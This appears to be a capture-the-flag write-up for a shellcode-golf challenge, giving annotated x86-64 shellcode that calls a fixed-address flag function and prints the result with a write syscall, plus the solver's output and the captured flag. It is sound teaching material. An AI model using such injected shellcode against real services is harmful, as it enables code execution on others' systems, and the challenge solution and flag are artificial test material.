# Solution

Use assembly to call the `flag` function - its location can be read by a debugger or disassembly since there is no PIE. The return address where the flag is located will be stored in `rax`. From this point on we can easily print the flag out with `write` syscall.

The shellcode is:
```assembly
;; first param RDI set to 1
mov dil, 1
;; address of flag function to EAX
mov eax, 0x401421
;; call flag(1)
call rax
;; write syscall prep stdout
mov edi, 1
;; address of _flag returned by flag(1)
mov rsi, rax
;; flag size 32 bytes
mov dl, 32
xor rax, rax
mov al, 1
;; write(1, _flag, 32)
syscall
```

Solution is in `golf-solution.py`.

```python
$ python3 golf-solution.py 
[+] Opening connection to 192.168.57.1 on port 9000: Done
b'Context - flag is at 0x401421, your shellcode goes to 0x7fb41e9a9000\n'
b'Your shellcode can be at most 27 bytes, go:'
[*] Switching to interactive mode
ibctf{w4t--are_U_t1g3r-w00dz?}
\x00[*] Got EOF while reading in interactive
$ 
```
